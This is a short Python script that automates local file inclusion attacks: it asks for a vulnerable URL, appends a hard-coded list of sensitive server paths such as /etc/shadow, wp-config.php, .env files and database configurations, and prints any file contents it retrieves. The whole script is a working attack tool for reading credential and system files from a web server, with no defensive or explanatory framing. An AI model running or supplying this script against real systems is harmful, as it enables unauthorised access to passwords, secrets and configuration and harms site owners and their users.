import requests

# Common file paths for LFI attacks
file_paths = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/apache2/apache2.conf",
    "/etc/httpd/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/messages",
    "/etc/my.cnf",
    "/etc/mongodb.conf",
    "/etc/redis/redis.conf",
    "/var/lib/mysql/mysql.sock",
    "/etc/php.ini",
    "/var/www/html/wp-config.php",
    "/var/www/html/wp-includes/wp-db.php",
    "/var/www/html/wp-content/debug.log",
    "/var/www/html/wp-admin/admin-ajax.php",
    "/var/www/html/configuration.php",
    "/var/www/html/sites/default/settings.php",
    "/var/www/html/app/config/parameters.yml",
    "/var/www/html/.env"
]

# Prompt user for the base URL
base_url = input("Enter the base URL (e.g. http://172.16.1.10/nav.php?page=): ")

# Iterate through the file paths and attempt to retrieve content
for file_path in file_paths:
    url = base_url + file_path
    print(f"Trying {url}")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Success! Contents of {file_path}:")
            print(response.text)
            print("\n" + "-" * 80 + "\n")
        else:
            print(f"Failed to access {file_path} (Status code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

print("Finished scanning.")
